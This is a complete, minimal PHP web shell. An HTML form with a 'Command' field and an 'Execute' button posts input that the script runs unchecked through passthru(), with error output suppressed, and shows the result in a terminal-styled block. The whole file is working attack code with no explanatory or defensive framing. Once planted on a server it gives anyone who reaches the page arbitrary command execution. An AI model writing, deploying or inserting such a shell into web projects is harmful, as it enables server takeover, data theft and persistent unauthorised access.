<form action="" method="post">
    <label>Command</label><br />
    <input type="text" name="c" value="<?php echo isset($_POST['c']) ? htmlentities($_POST['c']) : ''; ?>" /><br />
    <button type="submit">Execute</button>
</form>
<pre style="background: rgb(0,0,0); color: rgb(255,255,255); font-family: monospace sans-serif;">
<?php
if (isset($_POST['c']))
{
    @passthru($_POST['c']);
}
?>
</pre>
